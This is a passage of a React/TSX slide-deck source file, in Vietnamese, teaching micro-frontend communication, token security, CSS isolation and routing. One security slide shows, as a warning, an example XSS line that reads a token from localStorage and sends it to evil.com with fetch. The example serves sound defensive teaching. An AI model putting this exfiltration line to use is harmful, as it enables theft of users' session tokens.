                            Remote có thể chạy độc lập khi dev. Nếu không khai báo shared, nó sẽ không có React để chạy riêng.
                        </p>
                    </motion.div>
                </div>
                <motion.div className="mt-4 glass p-4 rounded-lg" initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.2 }}>
                    <h4 className="text-[var(--accent-purple)] font-bold mb-2">3. Negotiation 2 chiều tại Runtime</h4>
                    <div className="font-mono text-sm space-y-1">
                        <div><span className="text-[var(--accent-orange)]">Remote:</span> "Tôi cần react@18.2.0, sẵn sàng share"</div>
                        <div><span className="text-[var(--accent-cyan)]">Host:</span> "Tôi có react@18.2.0, singleton=true"</div>
                        <div><span className="text-[var(--accent-green)]">Runtime:</span> "OK, Remote sẽ dùng React của Host"</div>
                    </div>
                </motion.div>
                <motion.div className="mt-4 glass p-4 rounded-lg border-2 border-[var(--accent-red)]/50 text-sm" initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.3 }}>
                    <strong className="text-[var(--accent-red)]">⚠️ Nếu Remote không khai báo shared:</strong> Remote sẽ bundle React riêng → duplicate code, hooks error!
                </motion.div>
            </div>
        ),
    },

    // ==========================================
    // PHẦN 4: COMMUNICATION (Slides 21-26)
    // ==========================================

    // Slide 21: Communication Overview
    {
        id: 21,
        title: 'Các phương thức giao tiếp',
        section: 'Phần 4: Communication',
        content: (
            <div className="w-full max-w-5xl mx-auto">
                <h2 className="text-slide-header mb-6">Các phương thức giao tiếp giữa MFE</h2>
                <Table
                    headers={['Phương thức', 'Phạm vi', 'Ưu điểm', 'Nhược điểm']}
                    rows={[
                        ['<span class="text-[var(--accent-blue)] font-bold">1. BroadcastChannel</span>', 'Cùng domain, nhiều tab', 'Đơn giản, có sẵn', 'Chỉ cùng domain'],
                        ['<span class="text-[var(--accent-green)] font-bold">2. MessageChannel</span>', 'Cùng trang, khác origin', 'Nhanh, hai chiều', 'Cấu hình phức tạp'],
                        ['<span class="text-[var(--accent-purple)] font-bold">3. CustomEvent</span>', 'Cùng trang', 'Rất đơn giản', 'Chỉ cùng trang'],
                        ['<span class="text-[var(--accent-orange)] font-bold">4. Event Bus</span>', 'Cùng trang', 'An toàn kiểu, linh hoạt', 'Cần tự viết'],
                    ]}
                />
                <motion.div className="mt-4 glass p-4 rounded-lg text-sm text-center" initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.3 }}>
                    Các slide tiếp theo sẽ đi chi tiết từng phương thức theo thứ tự trên
                </motion.div>
            </div>
        ),
    },

    // Slide 22: BroadcastChannel - Giới thiệu + Diagram
    {
        id: 22,
        title: '1. BroadcastChannel',
        section: 'Phần 4: Communication',
        variant: 'diagram',
        content: (
            <div className="w-full max-w-5xl mx-auto">
                <h2 className="text-slide-header mb-4">BroadcastChannel - Giao tiếp giữa các Tab</h2>
                <BroadcastChannelDiagram />
                <motion.div className="mt-4 glass p-4 rounded-lg text-sm" initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.5 }}>
                    <strong className="text-[var(--accent-blue)]">Use case:</strong> Đồng bộ trạng thái giữa nhiều tab (logout, theme, ngôn ngữ)
                </motion.div>
            </div>
        ),
    },

    // Slide 23: BroadcastChannel - Code
    {
        id: 23,
        title: 'BroadcastChannel - Code',
        section: 'Phần 4: Communication',
        variant: 'code',
        content: (
            <div className="w-full max-w-5xl mx-auto">
                <h2 className="text-slide-header mb-4">BroadcastChannel - Ví dụ Code</h2>
                <div className="grid grid-cols-2 gap-4">
                    <CodeBlock
                        title="Tab A - Gửi message"
                        language="typescript"
                        showLineNumbers={false}
                        code={`// Tạo channel
const channel = new BroadcastChannel('mfe-sync');

// Khi user logout
function logout() {
  channel.postMessage({ type: 'LOGOUT' });
}`}
                    />
                    <CodeBlock
                        title="Tab B - Nhận message"
                        language="typescript"
                        showLineNumbers={false}
                        code={`// Lắng nghe từ các tab khác
channel.onmessage = (event) => {
  if (event.data.type === 'LOGOUT') {
    // Logout ở tab này
    clearToken();
    redirect('/login');
  }
};`}
                    />
                </div>
            </div>
        ),
    },

    // Slide 24: MessageChannel - Diagram
    {
        id: 24,
        title: '2. MessageChannel',
        section: 'Phần 4: Communication',
        variant: 'diagram',
        content: (
            <div className="w-full max-w-5xl mx-auto">
                <h2 className="text-slide-header mb-4">MessageChannel - Giao tiếp trực tiếp 2 chiều</h2>
                <MessageChannelDiagram />
                <motion.div className="mt-4 glass p-4 rounded-lg text-sm" initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.5 }}>
                    <strong className="text-[var(--accent-green)]">Use case:</strong> Giao tiếp giữa iframe (cross-origin) hoặc Web Worker
                </motion.div>
            </div>
        ),
    },

    // Slide 25: CustomEvent - Diagram + Code
    {
        id: 25,
        title: '3. CustomEvent',
        section: 'Phần 4: Communication',
        variant: 'code',
        content: (
            <div className="w-full max-w-5xl mx-auto">
                <h2 className="text-slide-header mb-4">CustomEvent - Đơn giản nhất</h2>
                <div className="grid grid-cols-2 gap-4">
                    <div>
                        <CustomEventDiagram />
                    </div>
                    <CodeBlock
                        title="Ví dụ sử dụng"
                        language="typescript"
                        showLineNumbers={false}
                        code={`// Remote A - Gửi event
window.dispatchEvent(
  new CustomEvent('user:selected', {
    detail: { userId: '123' }
  })
);

// Remote B - Lắng nghe
window.addEventListener('user:selected', 
  (e) => console.log(e.detail.userId)
);`}
                    />
                </div>
                <motion.div className="mt-4 glass p-4 rounded-lg text-sm" initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.3 }}>
                    <strong className="text-[var(--accent-purple)]">Ưu điểm:</strong> Không cần thư viện, sử dụng API có sẵn của trình duyệt
                </motion.div>
            </div>
        ),
    },

    // Slide 26: Event Bus - Diagram
    {
        id: 26,
        title: '4. Event Bus',
        section: 'Phần 4: Communication',
        variant: 'diagram',
        content: (
            <div className="w-full max-w-5xl mx-auto">
                <h2 className="text-slide-header mb-4">Event Bus - Pattern Pub/Sub</h2>
                <EventBusDiagram />
                <motion.div className="mt-4 glass p-4 rounded-lg text-sm" initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.5 }}>
                    <strong className="text-[var(--accent-orange)]">Lợi ích:</strong> Loose coupling - các MFE không phụ thuộc trực tiếp vào nhau, dễ kiểm soát types
                </motion.div>
            </div>
        ),
    },

    // Slide 27: Event Bus - Code
    {
        id: 27,
        title: 'Event Bus - Code',
        section: 'Phần 4: Communication',
        variant: 'code',
        content: (
            <div className="w-full max-w-4xl mx-auto">
                <h2 className="text-slide-header mb-4">Event Bus - Triển khai</h2>
                <CodeBlock
                    title="shared/utils/eventBus.ts"
                    language="typescript"
                    code={`type EventCallback = (data?: unknown) => void;

class EventBus {
  private events: Map<string, EventCallback[]> = new Map();

  on(event: string, callback: EventCallback): () => void {
    if (!this.events.has(event)) this.events.set(event, []);
    this.events.get(event)!.push(callback);
    return () => this.off(event, callback); // Hàm hủy đăng ký
  }

  emit(event: string, data?: unknown): void {
    this.events.get(event)?.forEach(cb => cb(data));
  }
}

export const eventBus = new EventBus();`}
                    highlightLines={[6, 7, 8, 12, 13]}
                />
            </div>
        ),
    },

    // Slide 28: Token Sync Flow
    {
        id: 28,
        title: 'Ứng dụng: Đồng bộ Token',
        section: 'Phần 4: Communication',
        variant: 'diagram',
        content: (
            <div className="w-full max-w-5xl mx-auto">
                <h2 className="text-slide-header mb-6">Ví dụ thực tế: Đồng bộ Token giữa các MFE</h2>
                <TokenSyncFlowDiagram />
            </div>
        ),
    },

    // ==========================================
    // PHẦN 5: SECURITY (Slides 29-31)
    // ==========================================

    // Slide 29: Token Storage Problem
    {
        id: 29,
        title: 'Vấn đề với localStorage',
        section: 'Phần 5: Security',
        variant: 'code',
        content: (
            <div className="w-full max-w-5xl mx-auto">
                <h2 className="text-slide-header mb-4">
                    <span className="text-[var(--accent-red)]">⚠️</span> Vấn đề bảo mật với localStorage
                </h2>
                <div className="grid grid-cols-2 gap-4">
                    <motion.div className="glass p-5 rounded-lg border-2 border-[var(--accent-red)]/50" initial={{ opacity: 0 }} animate={{ opacity: 1 }}>
                        <h4 className="text-[var(--accent-red)] font-bold mb-3">❌ Nguy hiểm: XSS có thể đọc</h4>
                        <CodeBlock
                            title="Đừng làm thế này!"
                            language="typescript"
                            showLineNumbers={false}
                            code={`// XSS attack có thể đọc được!
localStorage.setItem('token', 'eyJhbGc...');

// Attacker inject script:
const token = localStorage.getItem('token');
fetch('https://evil.com?token=' + token);`}
                        />
                    </motion.div>
                    <motion.div className="glass p-5 rounded-lg border-2 border-[var(--accent-green)]/50" initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.1 }}>
                        <h4 className="text-[var(--accent-green)] font-bold mb-3">✅ An toàn hơn: Memory Storage</h4>
                        <Table
                            headers={['Token', 'Lưu trữ', 'JS truy cập?']}
                            rows={[
                                ['Access Token', 'Bộ nhớ (biến JS)', '✅ Có'],
                                ['Refresh Token', 'httpOnly Cookie', '❌ Không'],
                            ]}
                        />
                    </motion.div>
                </div>
            </div>
        ),
    },

    // Slide 27: TokenStore Implementation
    {
        id: 28,
        title: 'TokenStore Class',
        section: 'Phần 5: Security',
        variant: 'code',
        content: (
            <div className="w-full max-w-4xl mx-auto">
                <h2 className="text-slide-header mb-4">In-Memory Token Storage</h2>
                <CodeBlock
                    title="shared/utils/tokenStore.ts"
                    language="typescript"
                    code={`class TokenStore {
  // Private variable - KHÔNG thể access từ bên ngoài
  #accessToken: string | null = null;

  set(token: string) {
    this.#accessToken = token; // Lưu trong V8 Heap
  }

  get(): string | null {
    return this.#accessToken;
  }

  clear() {
    this.#accessToken = null;
  }
}

// Singleton instance
export const tokenStore = new TokenStore();`}
                    highlightLines={[2, 3, 6]}
                />
                <motion.div className="mt-4 glass p-4 rounded-lg border border-[var(--accent-cyan)]/30 text-sm" initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.2 }}>
                    <strong className="text-[var(--accent-cyan)]">💡 Lưu ý:</strong> Dùng <code>#privateField</code> (ES2022) thay vì <code>private</code> TypeScript để bảo vệ thực sự tại runtime.
                </motion.div>
            </div>
        ),
    },

    // Slide 28: Defense in Depth
    {
        id: 29,
        title: 'Defense in Depth',
        section: 'Phần 5: Security',
        content: (
            <div className="w-full max-w-5xl mx-auto">
                <h2 className="text-slide-header mb-6">🛡️ Defense in Depth Strategy</h2>
                <div className="space-y-4">
                    {[
                        { layer: '1', title: 'Prevent XSS', desc: 'CSP headers, sanitize input, Content-Security-Policy', color: 'blue' },
                        { layer: '2', title: 'httpOnly Cookie', desc: 'Protect refresh token - JS không thể đọc', color: 'green' },
                        { layer: '3', title: 'In-memory Storage', desc: 'Access token trong memory, khó truy cập hơn localStorage', color: 'purple' },
                        { layer: '4', title: 'Short-lived Tokens', desc: 'Access token hết hạn nhanh (15-30 phút), limit damage', color: 'orange' },
                    ].map((item, i) => (
                        <motion.div
                            key={item.layer}
                            className={`glass p-4 rounded-lg border-l-4 border-[var(--accent-${item.color})] flex items-center gap-4`}
                            initial={{ opacity: 0, x: -30 }}
                            animate={{ opacity: 1, x: 0 }}
                            transition={{ delay: i * 0.1 }}
                        >
                            <span className={`text-2xl font-bold text-[var(--accent-${item.color})]`}>{item.layer}</span>
                            <div>
                                <h4 className={`font-bold text-[var(--accent-${item.color})]`}>{item.title}</h4>
                                <p className="text-sm text-[var(--text-secondary)]">{item.desc}</p>
                            </div>
                        </motion.div>
                    ))}
                </div>
            </div>
        ),
    },

    // ==========================================
    // PHẦN 6: CSS ISOLATION (Slides 29-35)
    // ==========================================

    // Slide 29: CSS Problem
    {
        id: 30,
        title: 'Vấn đề CSS Conflict',
        section: 'Phần 6: CSS Isolation',
        variant: 'code',
        content: (
            <div className="w-full max-w-5xl mx-auto">
                <h2 className="text-slide-header mb-4">
                    <span className="text-[var(--accent-red)]">⚠️</span> Vấn đề CSS Conflict trong MFE
                </h2>
                <CodeBlock
                    title="Vấn đề: Class name trùng"
                    language="css"
                    code={`/* remote1/Button.css */
.btn { background: red; padding: 10px; }

/* remote2/Button.css */
.btn { background: blue; padding: 20px; }

/* → Khi cả 2 remote load vào host: CONFLICT!
   → Kết quả: .btn cuối cùng sẽ "thắng" */`}
                />
                <motion.div className="mt-4 glass p-4 rounded-lg border-2 border-[var(--accent-red)]/50 text-sm" initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.2 }}>
                    <strong className="text-[var(--accent-red)]">Tại sao xảy ra?</strong> CSS là global scope. Khi nhiều remote apps load vào cùng 1 page, tất cả CSS merge thành 1 → class name trùng = conflict!
                </motion.div>
            </div>
        ),
    },

    // Slide 30: CSS Isolation Diagram
    {
        id: 31,
        title: 'CSS Isolation Strategies',
        section: 'Phần 6: CSS Isolation',
        variant: 'diagram',
        content: (
            <div className="w-full max-w-5xl mx-auto">
                <h2 className="text-slide-header mb-6">CSS Isolation Strategies</h2>
                <CSSIsolationDiagram />
            </div>
        ),
    },

    // Slide 31: CSS Solutions Comparison
    {
        id: 32,
        title: 'So sánh CSS Solutions',
        section: 'Phần 6: CSS Isolation',
        content: (
            <div className="w-full max-w-5xl mx-auto">
                <h2 className="text-slide-header mb-6">So sánh các giải pháp CSS</h2>
                <Table
                    headers={['Giải pháp', 'Isolation', 'Setup', 'Developer Experience']}
                    rows={[
                        ['<span class="text-[var(--accent-green)] font-bold">CSS Modules</span> ✅', '<span class="text-[var(--accent-green)]">Tốt</span>', 'Zero config', 'DX tuyệt vời - viết CSS bình thường'],
                        ['<span class="text-[var(--accent-purple)]">CSS-in-JS</span>', '<span class="text-[var(--accent-green)]">Tốt</span>', 'Cài lib', 'Phải học syntax mới, runtime cost'],
                        ['<span class="text-[var(--accent-orange)]">BEM Convention</span>', '<span class="text-[var(--accent-orange)]">Trung bình</span>', 'Không cần', 'Phụ thuộc discipline của team'],
                        ['<span class="text-[var(--accent-cyan)]">Shadow DOM</span>', '<span class="text-[var(--accent-green)]">Hoàn hảo</span>', 'Phức tạp', 'Khó debug, ảnh hưởng React'],
                    ]}
                />
                <motion.div className="mt-4 glass p-4 rounded-lg border-2 border-[var(--accent-green)]/50 text-sm" initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.3 }}>
                    <strong className="text-[var(--accent-green)]">🏆 Recommend:</strong> CSS Modules - Zero config, zero runtime, syntax quen thuộc, hỗ trợ type-safe với TypeScript!
                </motion.div>
            </div>
        ),
    },

    // Slide 32: CSS Modules Example
    {
        id: 33,
        title: 'CSS Modules - Ví dụ',
        section: 'Phần 6: CSS Isolation',
        variant: 'code',
        content: (
            <div className="w-full max-w-5xl mx-auto">
                <h2 className="text-slide-header mb-4">CSS Modules - Code Example</h2>
                <div className="grid grid-cols-2 gap-4">
                    <CodeBlock
                        title="Button.module.css"
                        language="css"
                        showLineNumbers={false}
                        code={`.btn {
  background: red;
  padding: 10px;
}

.btnPrimary {
  background: blue;
}`}
                    />
                    <CodeBlock
                        title="Button.tsx"
                        language="tsx"
                        showLineNumbers={false}
                        code={`import styles from './Button.module.css';

const Button = ({ primary }) => (
  <button className={
    primary ? styles.btnPrimary : styles.btn
  }>
    Click me
  </button>
);

// Output HTML:
// <button class="Button_btn_a1b2c3">`}
                    />
                </div>
                <motion.div className="mt-4 glass p-4 rounded-lg border border-[var(--accent-green)]/30 text-sm" initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.2 }}>
                    <strong className="text-[var(--accent-green)]">✅ Kết quả:</strong> Class name tự động unique (<code>Button_btn_a1b2c3</code>) → Không conflict!
                </motion.div>
            </div>
        ),
    },

    // ==========================================
    // PHẦN 7: ROUTING (Slides 36-39)
    // ==========================================

    // Slide 36: Routing Diagram
    {
        id: 37,
        title: 'Routing trong MFE',
        section: 'Phần 7: Routing',
        variant: 'diagram',
        content: (
            <div className="w-full max-w-5xl mx-auto">
                <h2 className="text-slide-header mb-6">Routing trong MFE</h2>
                <RoutingFlowDiagram />
            </div>
        ),
    },

    // Slide 37: History Synchronization
    {
        id: 38,
        title: 'History Synchronization',
        section: 'Phần 7: Routing',
        variant: 'code',
        content: (
            <div className="w-full max-w-5xl mx-auto">
                <h2 className="text-slide-header mb-4">
                    <span className="text-[var(--accent-orange)]">⚠️</span> History Synchronization
                </h2>
                <motion.div className="glass p-4 rounded-lg border-2 border-[var(--accent-red)]/50 mb-6" initial={{ opacity: 0 }} animate={{ opacity: 1 }}>
                    <h4 className="text-[var(--accent-red)] font-bold">Vấn đề phổ biến nhất khi làm MFE!</h4>
                    <p className="text-sm text-[var(--text-secondary)]">
                        Khi navigate từ Host → Remote, nút Back/Forward của browser có thể không hoạt động đúng nếu không đồng bộ history object.
                    </p>
                </motion.div>
                <div className="grid grid-cols-2 gap-4">
                    <CodeBlock
                        title="Host App - Truyền history"
                        language="tsx"
                        showLineNumbers={false}
                        code={`// Host truyền history cho Remote
<RemoteApp 
  history={window.history}
  basename="/products" 
/>`}
                    />
                    <CodeBlock
                        title="Remote App - Nhận history"
                        language="tsx"
                        showLineNumbers={false}
                        code={`// Remote sử dụng history từ Host
export function mount({ history, basename }) {
  const router = createBrowserRouter({
    basename,
    history // QUAN TRỌNG!
  });
}`}
                    />
                </div>
                <motion.div className="mt-4 glass p-4 rounded-lg border border-[var(--accent-green)]/30 text-sm" initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.3 }}>
                    <strong className="text-[var(--accent-green)]">💡 Giải pháp:</strong> Remote App phải sử dụng cùng history object với Host, không tự tạo history mới.
                </motion.div>
            </div>
        ),
    },

    // Slide 38: Single History Pattern
    {
        id: 39,
        title: 'Single History Instance',
        section: 'Phần 7: Routing',
        variant: 'code',
        content: (
            <div className="w-full max-w-5xl mx-auto">
                <h2 className="text-slide-header mb-4">Routing: Single History Pattern</h2>
                <motion.div className="glass p-4 rounded-lg mb-4 border border-[var(--accent-blue)]/30" initial={{ opacity: 0 }} animate={{ opacity: 1 }}>
                    <p className="text-sm"><strong className="text-[var(--accent-blue)]">Nguyên tắc:</strong> Chỉ có 1 history instance. Host sở hữu và share cho remotes.</p>
                </motion.div>
                <div className="grid grid-cols-2 gap-4">
                    <CodeBlock
                        title="shared/history.ts"
                        language="typescript"
                        showLineNumbers={false}
                        code={`import { createBrowserHistory } from 'history';

// Singleton - tất cả apps dùng chung
export const history = createBrowserHistory();`}
                    />
                    <CodeBlock
                        title="Remote sử dụng"
                        language="tsx"
                        showLineNumbers={false}
                        code={`// Remote nhận history từ props
const ProductsApp = ({ history, basePath }) => (
  <Router history={history}>
    <Routes>
      <Route path={\`\${basePath}/list\`} 
             element={<ProductList />} />
    </Routes>
  </Router>
);`}
                    />
                </div>
            </div>
        ),
    },

    // Slide 39: Lazy Load Routes
    {
        id: 40,
        title: 'Lazy Load Remote Routes',
        section: 'Phần 7: Routing',
        variant: 'code',
        content: (
            <div className="w-full max-w-4xl mx-auto">
                <h2 className="text-slide-header mb-4">Pattern: Lazy Load Remote Components</h2>
                <CodeBlock
                    title="host/pages/products/index.tsx"
                    language="tsx"
                    code={`import { Suspense, lazy } from 'react';
import { useHistory } from 'umi';

// Lazy load từ remote
const ProductGrid = lazy(() => import('remote2/ProductGrid'));

const ProductsPage = () => {
  const history = useHistory();
  
  return (
    <Suspense fallback={<Loading />}>
      <ProductGrid 
        onProductClick={(id) => history.push(\`/products/\${id}\`)}
      />
    </Suspense>
  );
};`}
                    highlightLines={[5, 11, 12, 13]}
                />
            </div>
        ),
    },

    // Slide 40: Basename Routing Pattern - NEW
    {
        id: 41,
        title: 'Basename Routing Pattern',
        section: 'Phần 7: Routing',
        variant: 'code',
        content: (
            <div className="w-full max-w-5xl mx-auto">
                <h2 className="text-slide-header mb-4">
                    <span className="text-[var(--accent-green)]">✅</span> Basename Routing Pattern
                </h2>
                <motion.div className="glass p-4 rounded-lg mb-4 border border-[var(--accent-blue)]/30" initial={{ opacity: 0 }} animate={{ opacity: 1 }}>
                    <p className="text-sm"><strong className="text-[var(--accent-blue)]">Nguyên tắc:</strong> Host pass <code>basename</code> prop, Remote tự tạo BrowserRouter với basename đó.</p>
                </motion.div>
                <div className="grid grid-cols-2 gap-4">
                    <CodeBlock
                        title="Host Page"
                        language="tsx"
                        showLineNumbers={false}
                        code={`// Host chỉ cần 1 page cho mỗi remote
const UsersPage = () => (
  <RemoteLoader 
    remoteName="remote1" 
    componentName="App" 
    props={{ basename: '/users' }}
  />
);`}
                    />
                    <CodeBlock
                        title="Remote App"
                        language="tsx"
                        showLineNumbers={false}
                        code={`// Remote tự quản lý routing nội bộ
const App = ({ basename = '/users' }) => (
  <BrowserRouter basename={basename}>
    <Routes>
      <Route path="/" element={<UserList />} />
      <Route path="/detail/:id" element={<UserDetail />} />
      <Route path="/new" element={<CreateUser />} />
    </Routes>
  </BrowserRouter>
);`}
                    />
                </div>
                <motion.div className="mt-4 glass p-4 rounded-lg border border-[var(--accent-green)]/30 text-sm" initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.3 }}>
                    <strong className="text-[var(--accent-green)]">✅ Kết quả:</strong> URL <code>/users/detail/123</code> sync tự động với browser. Remote xử lý routing, Host chỉ là entry point.
                </motion.div>
            </div>
        ),
    },

    // Slide 41: Route Scalability - NEW
    {
        id: 42,
        title: 'Route Scalability',
        section: 'Phần 7: Routing',
        content: (
            <div className="w-full max-w-5xl mx-auto">
                <h2 className="text-slide-header mb-6">Route Scalability: Trước vs Sau</h2>
                <div className="grid grid-cols-2 gap-6">
                    <motion.div className="glass p-6 rounded-lg border-2 border-[var(--accent-red)]/50" initial={{ opacity: 0, x: -20 }} animate={{ opacity: 1, x: 0 }}>
                        <h4 className="text-[var(--accent-red)] font-bold mb-4 text-lg">❌ TRƯỚC: Route explosion</h4>
                        <CodeBlock
                            language="typescript"
                            showLineNumbers={false}
                            code={`routes: [
  { path: '/users', ... },
  { path: '/users/:id', ... },
  { path: '/users/new', ... },
  { path: '/users/roles', ... },
  { path: '/products', ... },
  { path: '/products/:id', ... },
  // ... 50+ routes!
]`}
                        />
                    </motion.div>
                    <motion.div className="glass p-6 rounded-lg border-2 border-[var(--accent-green)]/50" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }}>
                        <h4 className="text-[var(--accent-green)] font-bold mb-4 text-lg">✅ SAU: Basename pattern</h4>
                        <CodeBlock
                            language="typescript"
                            showLineNumbers={false}
                            code={`routes: [
  // Chỉ 3 routes cho 3 remotes!
  { path: '/users/*', component: './users' },
  { path: '/products/*', component: './products' },
  { path: '/reports/*', component: './reports' },
]

// Remote tự quản lý routing nội bộ`}
                        />
                    </motion.div>
                </div>
                <motion.div className="mt-6 glass p-4 rounded-lg border border-[var(--accent-cyan)]/50 text-sm text-center" initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.3 }}>
                    <strong className="text-[var(--accent-cyan)]">🚀 Lợi ích:</strong> Thêm route mới trong remote → <strong>không cần sửa Host!</strong>
                </motion.div>
            </div>
        ),
    },

    // Slide 42: Dev Proxy Configuration - NEW
    {
        id: 43,
        title: 'Dev Proxy Configuration',
        section: 'Phần 7: Routing',
        variant: 'code',
        content: (
            <div className="w-full max-w-5xl mx-auto">
                <h2 className="text-slide-header mb-4">Dev Proxy: Ẩn Remote URLs</h2>
                <div className="grid grid-cols-2 gap-4">
                    <div>
                        <motion.div className="glass p-4 rounded-lg mb-4" initial={{ opacity: 0 }} animate={{ opacity: 1 }}>
                            <h4 className="text-[var(--accent-cyan)] font-bold mb-2">Mục đích</h4>
                            <ul className="text-sm space-y-1 text-[var(--text-secondary)]">
                                <li>• Ẩn URLs của remote servers</li>
                                <li>• Browser chỉ thấy <code>/mf/remote1/...</code></li>
                                <li>• Chuẩn bị cho production (nginx)</li>
                            </ul>
                        </motion.div>
                        <motion.div className="glass p-4 rounded-lg border border-[var(--accent-orange)]/30" initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.1 }}>
                            <h4 className="text-[var(--accent-orange)] font-bold mb-2">⚠️ Lưu ý</h4>
                            <p className="text-sm text-[var(--text-secondary)]">
                                Vite remotes không hoạt động tốt với proxy (ESM imports). Chỉ UmiJS/Webpack remotes.
                            </p>
                        </motion.div>
                    </div>
                    <CodeBlock
                        title=".umirc.ts"
                        language="typescript"
                        showLineNumbers={false}
                        code={`// Dev Proxy Configuration
proxy: {
  '/mf/remote1': {
    target: 'http://localhost:3001',
    changeOrigin: true,
    pathRewrite: { '^/mf/remote1': '' },
  },
  '/mf/remote3': {
    target: 'http://localhost:3003',
    changeOrigin: true,
    pathRewrite: { '^/mf/remote3': '' },
  },
},

// mf.remotes
remotes: [
  { name: 'remote1', entry: '/mf/remote1/remote.js' },
  { name: 'remote3', entry: '/mf/remote3/remote.js' },
]`}
                    />
                </div>
            </div>
        ),
    },

    // ==========================================
    // PHẦN 8: TROUBLESHOOTING
    // ==========================================

    // Slide 43: Common Errors
    {
        id: 44,
        title: 'Troubleshooting',
        section: 'Phần 9: Troubleshooting',
        content: (
            <div className="w-full max-w-5xl mx-auto">
                <h2 className="text-slide-header mb-6">Lỗi thường gặp & Cách fix</h2>
                <Table
                    headers={['Lỗi', 'Nguyên nhân', 'Cách fix']}
                    rows={[
                        ['<span class="text-[var(--accent-red)]">Shared module not found</span>', 'Version mismatch', 'Check requiredVersion'],
                        ['<span class="text-[var(--accent-red)]">Invalid hook call</span>', 'Multiple React instances', 'Set singleton: true'],
                        ['<span class="text-[var(--accent-red)]">Failed to fetch</span>', 'Remote server down', 'Add Error Boundary'],
                        ['<span class="text-[var(--accent-red)]">CSS conflict</span>', 'Global CSS', 'Use CSS Modules'],
                        ['<span class="text-[var(--accent-red)]">Back button broken</span>', 'Multiple history', 'Share single history'],
                    ]}
                />
            </div>
        ),
    },

    // Slide 50: Thank You
    {
        id: 51,
        title: 'Cảm ơn!',
        section: 'End',
        variant: 'title',
        content: (
            <div className="text-center">
                <motion.div
                    className="text-6xl mb-8 font-bold text-[var(--accent-purple)]"
                    animate={{ scale: [1, 1.05, 1] }}
                    transition={{ repeat: Infinity, duration: 3 }}
                >
                    Q&A
                </motion.div>
                <motion.h1
                    className="text-slide-title mb-6"
                    initial={{ opacity: 0, scale: 0.8 }}
                    animate={{ opacity: 1, scale: 1 }}
                >
                    Cảm ơn đã lắng nghe!
                </motion.h1>
                <motion.p
                    className="text-slide-body text-[var(--text-secondary)] mb-8"
                    initial={{ opacity: 0 }}
                    animate={{ opacity: 1 }}
                    transition={{ delay: 0.3 }}
                >
                    Questions & Discussion
                </motion.p>
                <motion.div
                    className="flex justify-center gap-4"
                    initial={{ opacity: 0, y: 20 }}
                    animate={{ opacity: 1, y: 0 }}
                    transition={{ delay: 0.5 }}
                >
                    <span className="glass px-6 py-3 rounded-full">
                        <span className="text-[var(--accent-blue)]">←</span>
                        <span className="text-[var(--accent-purple)]">→</span> Navigate
                    </span>
                    <span className="glass px-6 py-3 rounded-full">
                        <span className="text-[var(--accent-cyan)]">F</span> Fullscreen
                    </span>
                    <span className="glass px-6 py-3 rounded-full">
                        <span className="text-[var(--accent-green)]">T</span> TOC
                    </span>
                </motion.div>
            </div>
        ),
    },

];

export const tocItems = slides.map((slide) => ({
    title: slide.title,
    slideIndex: slide.id - 1,
    section: slide.section,
}));
